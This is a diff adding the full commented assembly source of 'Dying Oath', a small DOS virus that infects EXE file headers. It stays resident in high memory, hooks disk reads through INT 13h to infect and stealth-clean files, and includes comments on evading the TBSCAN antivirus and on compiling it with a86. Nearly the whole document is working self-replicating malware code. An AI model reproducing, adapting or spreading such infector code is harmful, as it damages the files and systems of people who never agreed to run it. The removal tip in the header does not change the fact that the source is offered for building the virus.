@@ -1,0 +1,234 @@
+;                   d y i n g . o a t h . b y . r e t r o
+;                                265 bytes 
+;
+;  This is a EXE header virus that goes resident in the HMA, when i13 is
+; hooked the vector isnt changed, but the address of the original i13
+; (stored on bootup) is changed and that gets called instead.
+;  On the first run it will install itself, build a parameter block then
+; re-execute the file. Now, because the virus is resident the file will be
+; cleaned upon execution. The virus will then get the errorlevel returned
+; and exit with the errorlevel...
+;  Removing this virus from an EXE file is easy: boot from a clean disk then
+; replace the EB at the start of the EXE file with a 'M'...its that easy!
+;
+; Note: When this file is compiled (with a86) it will look exactly like an
+; already infected file. Just rename the BIN to a EXE and run the file. The
+; file should say 'VIRUS!#@' when executed.
+;  The virus scans under one flag (the 'N' flag) when not resident, when
+; the virus is resident it is full stealth so there are no flags.
+        org     0
+Start:
+        jmp     short AfterHeader       ;Jump to our code.
+
+LastPageSize    dw      0030h           ;this is all the header shit...
+FileSizeInPages dw      0002h
+NumberOfEntries dw      0000h                                             
+SizeOfHeader    dw      0020h
+MinimumMemParas dw      0000h
+MaximumMemParas dw      0FFFFh
+InitialSS       dw      0002h
+InitialSP       dw      0010h
+NegativeChksum  dw      0F9A1h
+InitialIP       dw      0000h
+InitialCS       dw      0000h
+OffsOfRelocTbl  dw      001Eh
+OverlayNumber   dw      0000h
+                dw      0001h
+                db      3Eh dup (0)     ;fill up the space with zeros
+AfterHeader:
+        mov     ah,0Dh                  ;flush disk buffers
+        int     21h
+
+        mov     ax,4A02h                ;allocate some memory from HMA
+        mov     bx,offset EndOfVirus
+        int     2Fh
+
+        inc     di                      ;DI = FFFFh if no HMA
+        jnz     NoWorries
+        mov     al,1                    ;if error we cant execute old file..
+        jmp     ExitWithErrorlevel      ;..so just exit with errorlevel=1
+NoWorries:
+        dec     di                      ;set di back to how it was
+        mov     [NewOffs+100h],di
+
+        ; The above line is needed because when you allocate HMA the pointer
+        ;to the allocated block is never the same...so its sorta like getting
+        ;the offset at the start of a COM virus
+        
+        push    di                      ;save di for later
+
+        mov     si,100h                 ;start copying from 100h
+        mov     cx,offset EndOfVirus
+        rep movsb                       ;copy the virus up
+
+        pop     di                      ;restore di
+
+        mov     ax,70h
+        mov     ds,ax
+        mov     si,0B4h
+        add     di,offset OldInt
+        movsw
+        movsw
+        mov     [si-4],di
+        mov     [si-2],es
+
+        ; The original i13 is stored at 0070:00B4 and it has been there since
+        ;dos 3.3, so qark & kd inform me. The handler is straight after the
+        ;storage area for the old i13, so we save some code there
+
+        push    cs                      ;cs=ds
+        pop     ds
+        mov     es,[2Ch]                ;set ES = segment of the environment
+        xor     di,di                   ;zero di
+        mov     ax,di                   ;put zero in ax aswell
+        cld                             ;we want to go left-right in mem
+        inc     di      
+Search:                         
+        dec     di                      ;this just searches for two zeros
+        scasw
+        jne     Search
+        scasw                           ;Filename = the two zeros + a word
+
+        push    es
+        push    cs
+        pop     es
+        pop     ds
+
+        mov     ah,4Ah                          ;resize mem block
+        mov     bx,(offset EndOfVirus+10Fh)/10h
+        int     21h
+        shl     bx,4
+        mov     sp,bx                           ;set sp at end of our mem
+
+
+        push    ds                      ;save the pointers
+        push    di
+
+        ; Now we have to set up a parameter block coz we are going to execute
+        ;the file so it will be cleaned on read...
+
+        push    cs
+        pop     ds
+
+        mov     cx,3
+        mov     si,offset ParameterTable+100h
+        mov     bx,offset ParameterBlock+100h
+        lea     di,[bx+2]
+MakeParameterBlock:
+        movsb
+        scasb
+        mov     ax,cs
+        stosw
+        loop    MakeParameterBlock
+
+        pop     dx                              ;DS:DX=ES:DI=offset of fname
+        pop     ds
+
+        mov     ax,4B00h
+        int     21h
+
+        mov     ah,4Dh                          ;get the errorlevel returned
+        int     21h
+ExitWithErrorLevel:
+        mov     ah,4Ch                          ;go and exit with it
+        int     21h
+        db      '[Dying_Oath] by Retro'
+
+ParameterTable  db      80h,5Ch,6Ch
+;.xXx.xXx.xXx.xXx.xXx.xXx.xXx.xXx.xXx.xXx.xXx.xXx.xXx.xXx.xXx.xXx.xXx.xXx.xXx.
+Exit:
+        db      0EAh                            ;opcode of JMP ssss:oooo
+OldInt  dd      0
+
+Handler:
+        cmp     ah,2                            ;disk read ?
+        jne     Exit
+
+        push    si                              ;save that SI!
+
+        ; We need the MOV SI,xxxx becoz we aint never in the same part of mem
+        db      0BEh
+NewOffs dw      0
+
+        pushf                                   ;call the old i13
+        call    dword ptr cs:[si+OldInt]
+        jc      ReturnFar                       ;if carry, bail out
+
+        push    ds                              ;save some registers
+        pusha
+        pushf
+
+        push    cs                              ;cs=ds
+        pop     ds
+
+        mov     ax,es:[bx]                      ;check out the first 2 bytes
+        xor     ax,'ZM'                         ;anti-TBSCAN code!
+        je      Infect                          
+ShouldStealth:
+        cmp     byte ptr es:[bx],0EBh           ;see if already infected
+        jne     PopAllReturnFlags
+        cmp     word ptr es:[bx+AfterHeader],0DB4h
+        je      StealthIt
+        jmp     PopAllReturnFlags
+Infect:
+        cmp     word ptr es:[bx+4],65024/512    ;make sure file aint to big
+        ja      PopAllReturnFlags
+
+        cld
+        add     si,offset AfterHeader
+        lea     di,[bx+AfterHeader]
+        xor     ax,ax
+        mov     cx,offset EndOfVirus-offset AfterHeader
+        
+        pusha
+        rep scasb                               ;make sure there is space
+        popa
+        jne     PopAllReturnFlags
+        ;DontMoveVirusIn                 ;if there aint, well erm...
+
+        rep movsb                               ;move the virus in!
+
+        mov     byte ptr es:[bx],0EBh           ;put the jump in
+DontMoveVirusIn:
+        popf                                    ;get the original registers
+        popa
+        pusha
+        pushf
+
+        mov     ax,301h
+        pushf                                   ;rewrite the sectors
+        call    dword ptr [si+OldInt]
+StealthIt:
+        mov     byte ptr es:[bx],'M'            ;put the 'M' back
+
+        ; Now we fill the space that our virus sits in with zeros...
+        lea     di,[bx+AfterHeader]
+        xor     ax,ax
+        mov     cx,offset EndOfVirus-offset AfterHeader
+        rep stosb
+PopAllReturnFlags:
+        popf                                    ;restore flags
+PopAllReturn:
+        popa                                    ;restore some registers
+        pop     ds
+ReturnFar:
+        pop     si                              ;restore si
+        retf    2                               ;iret but dont change flags
+ParameterBlock:
+        db      0Bh dup (0)                     ;leave room for the params
+EndOfVirus:
+
+; the rest of this shit is the original file sorta, it just sez 'VIRUS!#@'
+
+        org     200h
+        push    cs                              ;original file starts at 200h
+        pop     ds                              ;cs=ds
+        mov     dx,0Eh
+        mov     ah,9                            ;display our funkee text
+        int     21h
+        mov     ax,4C00h                        ;and exit
+        int     21h
+        db      'VIRUS!#@$'
+        db      19h dup 0                       ;this is the stack...
+
+        
